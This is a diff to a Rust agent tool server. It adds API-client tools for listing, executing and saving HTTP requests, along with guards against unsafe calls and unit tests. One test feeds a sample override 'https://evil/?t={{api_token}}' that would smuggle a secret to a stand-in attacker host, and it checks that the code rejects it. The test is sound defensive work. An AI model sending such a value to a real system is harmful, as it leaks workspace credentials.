@@ -7,7 +7,10 @@
 //! `browser_navigate` (Task 6, opens a reader-mode browser tab), and the three
 //! cloud-console writers `aws_athena_query` (starts an Athena query execution),
 //! `aws_sqs_send` (produces one SQS message) and `k8s_action` (a kubectl
-//! rollout/scale/delete/Argo verb, see `docs/design/aws-k8s-consoles.md` §4.6)
+//! rollout/scale/delete/Argo verb, see `docs/design/aws-k8s-consoles.md` §4.6),
+//! and the API-client writers `otto_api_execute` (sends one saved request),
+//! `otto_api_upsert_request` (persists a saved request), and
+//! `otto_api_run_automation` (runs a human-authored automation)
 //! — which call the normal governed HTTP endpoints AS THE SESSION OWNER — the
 //! same workspace-role check (`Editor`) a human gets, no more. Canvas is meant
 //! to be agent-drawable, the vault is the agents' documentation home
@@ -45,8 +48,12 @@
 //!   graded `aws_sqs:View` by the policy table because nothing is consumed).
 //!   `canvas_create_scene`/`canvas_update_scene`, `otto_vault_write`/
 //!   `otto_vault_rename`/`otto_vault_delete`, `browser_navigate`, and the
-//!   cloud-console writers `aws_athena_query`/`aws_sqs_send`/`k8s_action` are
-//!   the ONLY tools that mutate persisted (or remote) state: they hit the
+//!   cloud-console writers `aws_athena_query`/`aws_sqs_send`/`k8s_action`, plus
+//!   `otto_api_execute` (ONE real HTTP request through a saved workspace request;
+//!   Editor-gated, SSRF-guarded, secrets resolved server-side and scrubbed from
+//!   the result), `otto_api_upsert_request` (persists a saved request), and
+//!   `otto_api_run_automation` (runs a human-authored automation), are the ONLY
+//!   tools that mutate persisted or remote state: they hit the
 //!   normal governed HTTP routes, which apply the same `WorkspaceRole::Editor`
 //!   / per-feature `Edit` gate a human caller hits — the token can only do what
 //!   the session's owner is already allowed to do (and vault delete only
@@ -856,6 +863,78 @@ fn tool_catalog() -> Value {
                 "description": "Personal agents: read messages from an agent room this agent is a member of, oldest first. Pass `after` (the last message id you saw) to page forward.",
                 "inputSchema": { "type": "object", "properties": { "room_id": { "type": "string" }, "after": { "type": "string" }, "limit": { "type": "integer" } }, "required": ["room_id"] }
             },
+            // ---- API client. Reads return the daemon's masked agent shapes;
+            // writers use the normal ApiClient:Edit routes as the session owner.
+            {
+                "name": "otto_api_list",
+                "description": "READ-ONLY: discover the workspace's API client — collections, saved requests (id/name/method/url template/auth type), environments (names + non-secret variables; secret values never returned) and automations. Call this FIRST to get ids; `q` filters by substring, `kind` narrows the set.",
+                "inputSchema": { "type": "object", "properties": {
+                    "q": { "type": "string", "description": "Optional substring filter." },
+                    "collection_id": { "type": "string", "description": "Optional collection id filter." },
+                    "kind": { "type": "string", "enum": ["all", "requests", "environments", "automations"], "description": "Result kind (default all)." }
+                } }
+            },
+            {
+                "name": "otto_api_get_request",
+                "description": "READ-ONLY: one saved request in full (headers/query/body/docs/scripts) with every secret masked. Pass `request_id` or a unique `name`.",
+                "inputSchema": { "type": "object", "properties": {
+                    "request_id": { "type": "string", "description": "Saved request id." },
+                    "name": { "type": "string", "description": "Unique saved request name (used when request_id is omitted)." }
+                } }
+            },
+            {
+                "name": "otto_api_history",
+                "description": "READ-ONLY: past executions (method/url/status/duration/source agent|human). Pass `id` for one entry with its response; else filter with q/status/request_id/source, limit ≤ 100.",
+                "inputSchema": { "type": "object", "properties": {
+                    "id": { "type": "string", "description": "History entry id; when present returns one entry." },
+                    "q": { "type": "string", "description": "Optional method or URL substring." },
+                    "status": { "type": "integer", "description": "Optional HTTP status." },
+                    "request_id": { "type": "string", "description": "Optional saved request id." },
+                    "source": { "type": "string", "enum": ["agent", "human"], "description": "Optional execution source." },
+                    "limit": { "type": "integer", "minimum": 1, "maximum": 100, "description": "Maximum rows (default 25, cap 100)." }
+                } }
+            },
+            {
+                "name": "otto_api_execute",
+                "description": "SENDS A REAL HTTP REQUEST: execute a SAVED request (by `request_id` or unique `name`) against an environment (`environment` = id or name, default the active one). Non-GET/HEAD/OPTIONS methods require `confirm:true`; an agent-authored request targeting a host no human request/run used requires `confirm_new_host:true` (the error says which). Secrets are resolved server-side and scrubbed from the result; JWTs come back as decoded claims (`jwt_claims`), never the token. `vars` override variables (values must not contain '{{').",
+                "inputSchema": { "type": "object", "properties": {
+                    "request_id": { "type": "string", "description": "Saved request id." },
+                    "name": { "type": "string", "description": "Unique saved request name (used when request_id is omitted)." },
+                    "environment": { "type": "string", "description": "Environment id or unique name; omit for active." },
+                    "vars": { "type": "object", "additionalProperties": { "type": "string" }, "description": "Per-run variable overrides; values cannot contain '{{'." },
+                    "timeout_ms": { "type": "integer", "minimum": 1, "maximum": 60000 },
+                    "confirm": { "type": "boolean", "description": "Confirm a non-safe HTTP method." },
+                    "confirm_new_host": { "type": "boolean", "description": "Confirm an unknown host for an agent-authored request." },
+                    "decode_jwt": { "type": "boolean", "description": "Return safe JWT claims (default true), never tokens." }
+                } }
+            },
+            {
+                "name": "otto_api_upsert_request",
+                "description": "PERSISTS: create (no `request_id`) or update a saved request. Accepts fields or a `curl` line (parsed server-side; explicit fields win). `collection_name` finds-or-creates a collection. Omitted `auth`/`extras` keep the stored values. Returns the saved request with secrets masked.",
+                "inputSchema": { "type": "object", "properties": {
+                    "request_id": { "type": "string", "description": "Saved request id to update; omit to create." },
+                    "name": { "type": "string", "description": "Saved request name." },
+                    "method": { "type": "string", "description": "HTTP method (default GET)." },
+                    "url": { "type": "string", "description": "URL template." },
+                    "headers": { "type": "array", "items": { "type": "object", "properties": { "key": { "type": "string" }, "value": { "type": "string" }, "enabled": { "type": "boolean" } }, "required": ["key", "value"] } },
+                    "query": { "type": "array", "items": { "type": "object", "properties": { "key": { "type": "string" }, "value": { "type": "string" }, "enabled": { "type": "boolean" } }, "required": ["key", "value"] } },
+                    "body_mode": { "type": "string", "enum": ["none", "json", "raw", "form", "multipart", "graphql"] },
+                    "body": { "type": "string" },
+                    "auth": { "type": "object", "description": "Request auth; plaintext secret members are moved to Keychain by the daemon." },
+                    "collection_id": { "type": "string" },
+                    "collection_name": { "type": "string", "description": "Unique collection name to find or create." },
+                    "docs_md": { "type": "string", "description": "Markdown request documentation." },
+                    "curl": { "type": "string", "description": "curl command parsed server-side; explicit fields win." }
+                }, "required": ["name"] }
+            },
+            {
+                "name": "otto_api_run_automation",
+                "description": "SENDS REAL HTTP REQUESTS: run a human-authored automation (`automation_id` or unique `name`) — its steps, assertions and extractions; returns the per-step report.",
+                "inputSchema": { "type": "object", "properties": {
+                    "automation_id": { "type": "string", "description": "Automation id." },
+                    "name": { "type": "string", "description": "Unique automation name (used when automation_id is omitted)." }
+                } }
+            },
             // ---- AWS console (docs/design/aws-k8s-consoles.md §6). Every tool
             // shells `aws` CLI v2 through the daemon with the ACCOUNT's own
             // credentials; the caller needs the per-service feature grant
@@ -964,6 +1043,12 @@ const VAULT_MUTATION_TOOLS: [&str; 4] = [
     "otto_vault_write_file",
     "otto_vault_rename",
     "otto_vault_delete",
+];
+
+const API_MUTATION_TOOLS: [&str; 3] = [
+    "otto_api_execute",
+    "otto_api_upsert_request",
+    "otto_api_run_automation",
 ];
 
 const VAULT_REVIEW_READ_TOOLS: [(&str, &str); 8] = [
@@ -1125,6 +1210,84 @@ impl ReadCall {
     fn post(path: String, body: Value) -> Self {
         Self { post: true, path, body: Some(body) }
     }
+}
+
+/// Workspace-scoped base path for the saved-request API client.
+fn api_base(ctx: &Ctx) -> Result<String, String> {
+    let ws = ctx
+        .workspace_id
+        .as_deref()
+        .filter(|s| !s.is_empty())
+        .ok_or("no workspace context (OTTO_WORKSPACE_ID unset)")?;
+    Ok(format!("/workspaces/{}/api-client", seg(ws)))
+}
+
+/// Select one case-insensitive exact name match, reporting candidate ids when
+/// duplicate names make the request ambiguous.
+fn pick_by_name<'a>(items: &'a [Value], name: &str, what: &str) -> Result<&'a Value, String> {
+    let matches: Vec<&Value> = items
+        .iter()
+        .filter(|item| {
+            item.get("name")
+                .and_then(Value::as_str)
+                .is_some_and(|candidate| candidate.eq_ignore_ascii_case(name))
+        })
+        .collect();
+    match matches.as_slice() {
+        [] => Err(format!("no {what} named '{name}'")),
+        [item] => Ok(item),
+        many => {
+            let ids = many
+                .iter()
+                .map(|item| item.get("id").and_then(Value::as_str).unwrap_or("<missing id>"))
+                .collect::<Vec<_>>()
+                .join(", ");
+            Err(format!("ambiguous {what} '{name}': {ids}"))
+        }
+    }
+}
+
+/// Reject nested template expansion in per-run overrides before any upstream
+/// request is made. The daemon repeats this check at the trust boundary.
+fn check_override_vars(vars: &Value) -> Result<(), String> {
+    let vars = vars
+        .as_object()
+        .ok_or_else(|| "argument `vars` must be an object".to_string())?;
+    for (key, value) in vars {
+        if value.as_str().is_some_and(|value| value.contains("{{")) {
+            return Err(format!("vars override '{key}' must not contain '{{{{'"));
+        }
+    }
+    Ok(())
+}
+
+/// Merge a parsed curl shape under explicit tool arguments. Auth and extras are
+/// absent unless supplied so PATCH preserves the daemon's stored values.
+fn merge_upsert(args: &Value, parsed_curl: Option<&Value>) -> Value {
+    const CURL_FIELDS: [&str; 7] = ["method", "url", "headers", "query", "body_mode", "body", "auth"];
+    const EXPLICIT_FIELDS: [&str; 9] = [
+        "name", "method", "url", "headers", "query", "body_mode", "body", "auth", "collection_id",
+    ];
+
+    let mut merged = serde_json::Map::new();
+    if let Some(parsed) = parsed_curl {
+        for field in CURL_FIELDS {
+            if let Some(value) = parsed.get(field) {
+                merged.insert(field.to_string(), value.clone());
+            }
+        }
+    }
+    for field in EXPLICIT_FIELDS {
+        if let Some(value) = args.get(field) {
+            merged.insert(field.to_string(), value.clone());
+        }
+    }
+    merged.entry("method".to_string()).or_insert_with(|| json!("GET"));
+    merged.entry("body_mode".to_string()).or_insert_with(|| json!("none"));
+    if let Some(docs_md) = args.get("docs_md") {
+        merged.insert("extras".to_string(), json!({ "v": 1, "docs_md": docs_md }));
+    }
+    Value::Object(merged)
 }
 
 /// Map a feature read tool + its arguments to the upstream daemon read. Pure: no
@@ -1454,6 +1617,241 @@ fn seg(s: &str) -> String {
 /// audited row count, or an error string surfaced to the agent.
 async fn run_tool(ctx: &Ctx, name: &str, args: &Value) -> Result<(Value, Option<i64>), String> {
     match name {
+        // API-client reads and writes are thin wrappers over the masked,
+        // workspace-scoped daemon routes. All returned values pass `finalize`.
+        "otto_api_list" => {
+            let base = api_base(ctx)?;
+            let query = opt_query(
+                args,
+                &[("q", "q"), ("collection_id", "collection_id"), ("kind", "kind")],
+            );
+            let path = if query.is_empty() {
+                format!("{base}/overview")
+            } else {
+                format!("{base}/overview?{}", query.trim_start_matches('&'))
+            };
+            Ok(finalize(ctx.get_json(&path).await?))
+        }
+        "otto_api_get_request" => {
+            let base = api_base(ctx)?;
+            let request_id = if let Some(id) = arg_optional_string(args, "request_id")?
+                .filter(|id| !id.is_empty())
+            {
+                id
+            } else {
+                let request_name = arg_optional_string(args, "name")?
+                    .filter(|name| !name.is_empty())
+                    .ok_or("pass `request_id` or a unique `name`")?;
+                let overview = ctx
+                    .get_json(&format!("{base}/overview?kind=requests&q={}", seg(&request_name)))
+                    .await?;
+                let requests = overview
+                    .get("requests")
+                    .and_then(Value::as_array)
+                    .ok_or("daemon response missing requests array")?;
+                pick_by_name(requests, &request_name, "request")?
+                    .get("id")
+                    .and_then(Value::as_str)
+                    .ok_or("matched request has no id")?
+                    .to_string()
+            };
+            let raw = ctx
+                .get_json(&format!("{base}/requests/{}?shape=agent", seg(&request_id)))
+                .await?;
+            Ok(finalize(raw))
+        }
+        "otto_api_history" => {
+            let base = api_base(ctx)?;
+            if let Some(id) = arg_optional_string(args, "id")?.filter(|id| !id.is_empty()) {
+                let raw = ctx.get_json(&format!("{base}/history/{}", seg(&id))).await?;
+                return Ok(finalize(raw));
+            }
+            let limit = if args.get("limit").is_some() {
+                arg_u64(args, "limit")?.clamp(1, 100)
+            } else {
+                25
+            };
+            let mut path = format!("{base}/history?limit={limit}");
+            path.push_str(&opt_query(
+                args,
+                &[("q", "q"), ("status", "status"), ("request_id", "request_id"), ("source", "source")],
+            ));
+            Ok(finalize(ctx.get_json(&path).await?))
+        }
+        "otto_api_execute" => {
+            let base = api_base(ctx)?;
+            if let Some(vars) = args.get("vars") {
+                check_override_vars(vars)?;
+            }
+            let request_id = if let Some(id) = arg_optional_string(args, "request_id")?
+                .filter(|id| !id.is_empty())
+            {
+                id
+            } else {
+                let request_name = arg_optional_string(args, "name")?
+                    .filter(|name| !name.is_empty())
+                    .ok_or("pass `request_id` or a unique `name`")?;
+                let overview = ctx
+                    .get_json(&format!("{base}/overview?kind=requests&q={}", seg(&request_name)))
+                    .await?;
+                let requests = overview
+                    .get("requests")
+                    .and_then(Value::as_array)
+                    .ok_or("daemon response missing requests array")?;
+                pick_by_name(requests, &request_name, "request")?
+                    .get("id")
+                    .and_then(Value::as_str)
+                    .ok_or("matched request has no id")?
+                    .to_string()
+            };
+
+            let mut body = json!({ "shape": "agent" });
+            if let Some(environment) = arg_optional_string(args, "environment")?
+                .filter(|environment| !environment.is_empty())
+            {
+                let environments = ctx.get_json(&format!("{base}/environments")).await?;
+                let environments = environments
+                    .as_array()
+                    .ok_or("daemon response missing environments array")?;
+                let environment_id = if let Some(found) = environments.iter().find(|item| {
+                    item.get("id").and_then(Value::as_str) == Some(environment.as_str())
+                }) {
+                    found
+                        .get("id")
+                        .and_then(Value::as_str)
+                        .ok_or("matched environment has no id")?
+                        .to_string()
+                } else {
+                    let overview = ctx
+                        .get_json(&format!(
+                            "{base}/overview?kind=environments&q={}",
+                            seg(&environment)
+                        ))
+                        .await?;
+                    let environments = overview
+                        .get("environments")
+                        .and_then(Value::as_array)
+                        .ok_or("daemon response missing environments array")?;
+                    pick_by_name(environments, &environment, "environment")?
+                        .get("id")
+                        .and_then(Value::as_str)
+                        .ok_or("matched environment has no id")?
+                        .to_string()
+                };
+                body["environment_id"] = json!(environment_id);
+            }
+            for key in ["vars", "timeout_ms", "confirm", "confirm_new_host", "decode_jwt"] {
+                if let Some(value) = args.get(key) {
+                    body[key] = value.clone();
+                }
+            }
+            let raw = ctx
+                .post_json(&format!("{base}/requests/{}/execute", seg(&request_id)), &body)
+                .await?;
+            Ok(finalize(raw))
+        }
+        "otto_api_upsert_request" => {
+            let base = api_base(ctx)?;
+            let _name = arg_str(args, "name")?;
+            let parsed_curl = match arg_optional_string(args, "curl")?.filter(|curl| !curl.is_empty()) {
+                Some(curl) => Some(
+                    ctx.post_json("/api-client/import-curl", &json!({ "curl": curl }))
+                        .await?,
+                ),
+                None => None,
+            };
+
+            let mut effective_args = args.clone();
+            if args.get("collection_id").is_none() {
+                if let Some(collection_name) = arg_optional_string(args, "collection_name")?
+                    .filter(|name| !name.is_empty())
+                {
+                    let overview = ctx
+                        .get_json(&format!(
+                            "{base}/overview?kind=requests&q={}",
+                            seg(&collection_name)
+                        ))
+                        .await?;
+                    let collections = overview
+                        .get("collections")
+                        .and_then(Value::as_array)
+                        .ok_or("daemon response missing collections array")?;
+                    let collection_id = match pick_by_name(collections, &collection_name, "collection") {
+                        Ok(collection) => collection
+                            .get("id")
+                            .and_then(Value::as_str)
+                            .ok_or("matched collection has no id")?
+                            .to_string(),
+                        Err(error) if error == format!("no collection named '{collection_name}'") => {
+                            let collection = ctx
+                                .post_json(
+                                    &format!("{base}/collections"),
+                                    &json!({ "name": collection_name }),
+                                )
+                                .await?;
+                            collection
+                                .get("id")
+                                .and_then(Value::as_str)
+                                .ok_or("created collection has no id")?
+                                .to_string()
+                        }
+                        Err(error) => return Err(error),
+                    };
+                    effective_args["collection_id"] = json!(collection_id);
+                }
+            }
+            let body = merge_upsert(&effective_args, parsed_curl.as_ref());
+            let saved = if let Some(request_id) = arg_optional_string(args, "request_id")?
+                .filter(|id| !id.is_empty())
+            {
+                ctx.patch_json(&format!("{base}/requests/{}", seg(&request_id)), &body)
+                    .await?
+            } else {
+                ctx.post_json(&format!("{base}/requests"), &body).await?
+            };
+            let request_id = saved
+                .get("id")
+                .and_then(Value::as_str)
+                .ok_or("saved request has no id")?;
+            let raw = ctx
+                .get_json(&format!("{base}/requests/{}?shape=agent", seg(request_id)))
+                .await?;
+            Ok(finalize(raw))
+        }
+        "otto_api_run_automation" => {
+            let base = api_base(ctx)?;
+            let automation_id = if let Some(id) = arg_optional_string(args, "automation_id")?
+                .filter(|id| !id.is_empty())
+            {
+                id
+            } else {
+                let automation_name = arg_optional_string(args, "name")?
+                    .filter(|name| !name.is_empty())
+                    .ok_or("pass `automation_id` or a unique `name`")?;
+                let overview = ctx
+                    .get_json(&format!(
+                        "{base}/overview?kind=automations&q={}",
+                        seg(&automation_name)
+                    ))
+                    .await?;
+                let automations = overview
+                    .get("automations")
+                    .and_then(Value::as_array)
+                    .ok_or("daemon response missing automations array")?;
+                pick_by_name(automations, &automation_name, "automation")?
+                    .get("id")
+                    .and_then(Value::as_str)
+                    .ok_or("matched automation has no id")?
+                    .to_string()
+            };
+            let raw = ctx
+                .post_json(
+                    &format!("{base}/automations/{}/run", seg(&automation_id)),
+                    &json!({}),
+                )
+                .await?;
+            Ok(finalize(raw))
+        }
         // Personal-agent room tools: the calling session's id (from the spawn
         // env, set by the daemon) is injected so the server can resolve which
         // personal agent is speaking via the session's `meta.personal_agent`
@@ -2183,12 +2581,18 @@ async fn handle(ctx: &Ctx, msg: Value) -> Option<Value> {
                 .to_string();
             let args = params.get("arguments").cloned().unwrap_or(json!({}));
             if is_vault_docs_reviewer(ctx.source.as_deref())
-                && VAULT_MUTATION_TOOLS.contains(&name.as_str())
+                && (VAULT_MUTATION_TOOLS.contains(&name.as_str())
+                    || API_MUTATION_TOOLS.contains(&name.as_str()))
             {
+                let family = if API_MUTATION_TOOLS.contains(&name.as_str()) {
+                    "API mutation"
+                } else {
+                    "vault mutation"
+                };
                 return Some(rpc_ok(
                     id,
                     tool_result(
-                        &json!({ "error": "vault mutation tools are disabled for documentation review sessions" }),
+                        &json!({ "error": format!("{family} tools are disabled for documentation review sessions") }),
                         true,
                     ),
                 ));
@@ -2477,6 +2881,116 @@ mod tests {
                 tool["name"]
             );
         }
+    }
+
+    #[test]
+    fn tool_catalog_lists_the_api_client_tools() {
+        let catalog = tool_catalog();
+        let tools = catalog["tools"].as_array().unwrap();
+        for name in [
+            "otto_api_list",
+            "otto_api_get_request",
+            "otto_api_history",
+            "otto_api_execute",
+            "otto_api_upsert_request",
+            "otto_api_run_automation",
+        ] {
+            let tool = tools
+                .iter()
+                .find(|tool| tool["name"] == name)
+                .unwrap_or_else(|| panic!("catalog missing API-client tool {name}"));
+            assert_eq!(tool["inputSchema"]["type"], json!("object"));
+        }
+    }
+
+    #[tokio::test]
+    async fn api_execute_requires_request_id_or_name() {
+        let response = handle(
+            &test_ctx(),
+            json!({ "jsonrpc": "2.0", "id": 41, "method": "tools/call",
+                    "params": { "name": "otto_api_execute", "arguments": {} } }),
+        )
+        .await
+        .unwrap();
+        assert_eq!(response["result"]["isError"], json!(true));
+        let text = response["result"]["content"][0]["text"].as_str().unwrap();
+        assert!(text.contains("request_id"), "got: {text}");
+        assert!(!text.contains("request failed"), "must fail before upstream I/O: {text}");
+    }
+
+    #[tokio::test]
+    async fn api_execute_rejects_brace_overrides() {
+        let response = handle(
+            &test_ctx(),
+            json!({ "jsonrpc": "2.0", "id": 42, "method": "tools/call",
+                    "params": { "name": "otto_api_execute", "arguments": {
+                        "request_id": "req-1", "vars": { "base_url": "https://evil/?t={{api_token}}" }
+                    } } }),
+        )
+        .await
+        .unwrap();
+        assert_eq!(response["result"]["isError"], json!(true));
+        let text = response["result"]["content"][0]["text"].as_str().unwrap();
+        assert!(text.contains("vars override 'base_url' must not contain '{{'"), "got: {text}");
+        assert!(!text.contains("request failed"), "must fail before upstream I/O: {text}");
+    }
+
+    #[test]
+    fn merge_upsert_overlays_args_on_curl_and_omits_auth_when_absent() {
+        let parsed = json!({
+            "method": "POST",
+            "url": "https://parsed.example/items",
+            "headers": [{"key":"accept","value":"application/json"}],
+            "query": [{"key":"page","value":"1"}],
+            "body_mode": "json",
+            "body": "{\"from\":\"curl\"}",
+            "auth": {"type":"bearer","token":"secret"}
+        });
+        let merged = merge_upsert(
+            &json!({
+                "name": "Items",
+                "method": "PUT",
+                "url": "https://explicit.example/items",
+                "body": "{\"from\":\"args\"}",
+                "collection_id": "c1",
+                "docs_md": "Item docs"
+            }),
+            Some(&parsed),
+        );
+        assert_eq!(merged["name"], json!("Items"));
+        assert_eq!(merged["method"], json!("PUT"));
+        assert_eq!(merged["url"], json!("https://explicit.example/items"));
+        assert_eq!(merged["body"], json!("{\"from\":\"args\"}"));
+        assert_eq!(merged["query"], parsed["query"]);
+        assert_eq!(merged["auth"], parsed["auth"]);
+        assert_eq!(merged["extras"], json!({"v":1,"docs_md":"Item docs"}));
+
+        let without_auth = merge_upsert(&json!({"name":"Health","url":"/health"}), None);
+        assert_eq!(without_auth["method"], json!("GET"));
+        assert_eq!(without_auth["body_mode"], json!("none"));
+        assert!(without_auth.get("auth").is_none());
+        assert!(without_auth.get("extras").is_none());
+    }
+
+    #[test]
+    fn pick_by_name_is_case_insensitive_and_reports_ambiguity() {
+        let items = json!([
+            {"id":"r1","name":"Login"},
+            {"id":"r2","name":"Health"}
+        ]);
+        let items = items.as_array().unwrap();
+        assert_eq!(pick_by_name(items, "login", "request").unwrap()["id"], json!("r1"));
+        assert_eq!(
+            pick_by_name(items, "missing", "request").unwrap_err(),
+            "no request named 'missing'"
+        );
+
+        let ambiguous = json!([
+            {"id":"r1","name":"Login"},
+            {"id":"r3","name":"LOGIN"}
+        ]);
+        let error = pick_by_name(ambiguous.as_array().unwrap(), "login", "request").unwrap_err();
+        assert_eq!(error, "ambiguous request 'login': r1, r3");
     }
 
     #[tokio::test]
